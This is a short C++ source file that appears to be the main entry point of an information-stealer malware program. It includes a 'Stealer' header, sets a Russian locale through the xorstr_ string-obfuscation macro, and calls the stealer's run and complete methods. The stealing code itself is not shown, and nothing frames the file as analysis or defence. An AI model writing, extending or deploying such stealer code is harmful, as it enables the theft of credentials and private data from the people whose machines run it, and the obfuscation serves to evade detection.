#include "stealer/Stealer.h"
#include <locale>

int main() {
    std::locale::global(std::locale(""));
    setlocale(LC_ALL, xorstr_("ru-RU"));

    Stealer stealer;
    stealer.run();
    stealer.complete();

    return 0;
}
